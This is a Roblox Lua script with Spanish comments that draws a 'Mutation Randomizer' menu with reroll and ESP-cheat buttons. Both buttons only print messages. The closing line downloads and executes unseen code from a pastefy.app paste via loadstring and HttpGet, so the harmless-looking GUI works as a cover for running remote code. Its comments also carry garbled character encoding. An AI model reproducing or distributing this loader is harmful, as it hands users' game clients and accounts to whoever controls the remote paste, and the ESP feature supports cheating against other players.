-- LocalScript (StarterGui o StarterPlayerScripts)

local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "MutationGUI"
gui.ResetOnSpawn = false

-- Contenedor principal
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 230, 0, 130)
frame.Position = UDim2.new(0.05, 0, 0.35, 0)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.BorderSizePixel = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 6)

-- T√≠tulo rosa fuerte
local title = Instance.new("TextLabel", frame)
title.Text = "Mutation Randomizer"
title.Size = UDim2.new(1, 0, 0, 25)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255, 0, 144)
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 15
title.BorderSizePixel = 0

-- Bot√≥n Reroll azul
local rerollBtn = Instance.new("TextButton", frame)
rerollBtn.Text = "üìç Reroll Mutation"
rerollBtn.Position = UDim2.new(0.05, 0, 0, 35)
rerollBtn.Size = UDim2.new(0.9, 0, 0, 30)
rerollBtn.BackgroundColor3 = Color3.fromRGB(152, 201, 255)
rerollBtn.TextColor3 = Color3.new(0, 0, 0)
rerollBtn.Font = Enum.Font.GothamBold
rerollBtn.TextSize = 14
Instance.new("UICorner", rerollBtn).CornerRadius = UDim.new(0, 4)

-- Bot√≥n Toggle ESP verde claro
local espBtn = Instance.new("TextButton", frame)
espBtn.Text = "üí† Toggle ESP"
espBtn.Position = UDim2.new(0.05, 0, 0, 70)
espBtn.Size = UDim2.new(0.9, 0, 0, 30)
espBtn.BackgroundColor3 = Color3.fromRGB(230, 255, 225)
espBtn.TextColor3 = Color3.new(0, 0, 0)
espBtn.Font = Enum.Font.GothamBold
espBtn.TextSize = 14
Instance.new("UICorner", espBtn).CornerRadius = UDim.new(0, 4)

-- Texto de cr√©ditos abajo
local credit = Instance.new("TextLabel", frame)
credit.Text = "Made by Xenooscript"
credit.Size = UDim2.new(1, 0, 0, 20)
credit.Position = UDim2.new(0, 0, 1, -20)
credit.BackgroundTransparency = 1
credit.TextColor3 = Color3.fromRGB(255, 0, 144)
credit.Font = Enum.Font.Gotham
credit.TextSize = 12

-- Funciones de los botones
rerollBtn.MouseButton1Click:Connect(function()
    print("üîÅ Reroll ejecutado")
end)

local espEnabled = false
espBtn.MouseButton1Click:Connect(function()
    espEnabled = not espEnabled
    print("üîç ESP: " .. (espEnabled and "Activado" or "Desactivado"))
end)

-- üîó Ejecutar el script externo adicional
loadstring(game:HttpGet("https://pastefy.app/1pxVK68s/raw"))()
